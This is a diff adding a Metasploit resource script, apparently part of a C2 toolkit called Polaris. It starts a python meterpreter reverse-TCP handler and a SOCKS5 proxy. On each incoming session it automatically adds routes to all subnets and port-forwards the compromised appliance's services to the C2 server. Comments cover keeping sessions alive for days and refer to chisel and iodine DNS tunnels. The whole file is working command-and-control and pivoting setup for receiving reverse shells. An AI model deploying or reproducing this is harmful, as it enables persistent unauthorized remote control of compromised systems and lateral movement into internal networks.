@@ -1,0 +1,49 @@
+# Polaris — Metasploit listener resource script
+# Usage: msfconsole -r /opt/pr0t31n/Polaris/listener.rc
+#
+# Starts a python/meterpreter/reverse_tcp handler on :4443.
+# On session open, automatically:
+#   1. Adds routes for all subnets (autoroute)
+#   2. Port-forwards appliance services to C2 server high ports
+#
+# Chisel server and iodined are managed by Polaris (supervisor.py),
+# NOT by this resource script.
+#
+# SOCKS proxy is available on :1080 but prefer the port forwards —
+# Python meterpreter is single-threaded and heavy SOCKS browsing
+# (especially WebSocket/SocketIO apps) starves the command channel.
+
+# ── SOCKS Proxy (start first so it's ready when session arrives) ──
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+# ── Listener ──
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp
+set LHOST 10.20.70.172
+set LPORT 4443
+set ExitOnSession false
+
+# Keep sessions alive over lossy / NAT'd links.
+# DO NOT use 0 — the Python meterpreter stage interprets 0 as
+# "expire immediately" (communication_last + 0 < time.time() is True
+# after one select() cycle).  The stage's session_has_expired handles
+# 0 correctly but communication_has_expired does NOT.  Use large
+# non-zero values instead.
+set SessionCommunicationTimeout 3600
+set SessionExpirationTimeout 604800
+
+# Auto-run on session open: autoroute + portfwd from file
+set AutoRunScript multi_console_command -r /opt/pr0t31n/Polaris/auto_commands.txt
+
+run -j
+
+echo ""
+echo "════════════════════════════════════════════════════"
+echo " LandNav listener active on 10.20.70.172:4443"
+echo " SOCKS5 proxy on :1080 (routes through sessions)"
+echo " Waiting for appliance call-home..."
+echo "════════════════════════════════════════════════════"
+echo ""
